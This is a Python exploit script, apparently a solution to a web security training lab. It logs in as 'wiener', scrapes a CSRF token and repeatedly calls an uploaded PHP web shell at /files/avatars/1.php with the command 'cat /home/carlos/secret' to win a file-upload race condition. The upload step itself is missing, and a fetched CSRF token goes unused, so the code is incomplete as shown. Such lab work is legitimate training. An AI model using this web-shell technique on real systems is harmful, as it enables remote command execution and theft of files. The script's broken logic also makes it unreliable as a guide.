import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import random
import string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(url:str, s:requests.Session):
    try:
        r = s.get(url, verify=False, proxies=proxies, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name':'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error {ex}")
        return None

def login(url:str, s:requests.Session, csrf:str):
    login_url = url + '/login'
    login_data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
    try:
        r = s.post(login_url, login_data, verify=False, proxies=proxies, timeout=5)
        response = r.text
        if 'Log out' in response:
            print("Logged in successfully")
            return True
        else:
            print("Failed to log in")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def race_condition(url:str, s:requests.Session):
    # Requires a new csrf token
    csrf = get_csrf(url + '/my-account?id=wiener', s)
    
    #trying to read the secret file before the script gets deleted
    for i in range(10):    
        print("Accessing secret file")
        req = s.get(url + '/files/avatars/1.php?command=' + 'cat /home/carlos/secret', verify=False, proxies=proxies)
        print(req.text)

        

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)

    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    s = requests.Session()
    csrf = get_csrf(url + '/login', s)
    if not csrf:
        print("Could not find csrf token")
        sys.exit(-1)
    
    print("Logging in as wiener")
    if not login(url, s, csrf):
        sys.exit(-1)
    
    race_condition(url, s)

if __name__ == '__main__':
    main()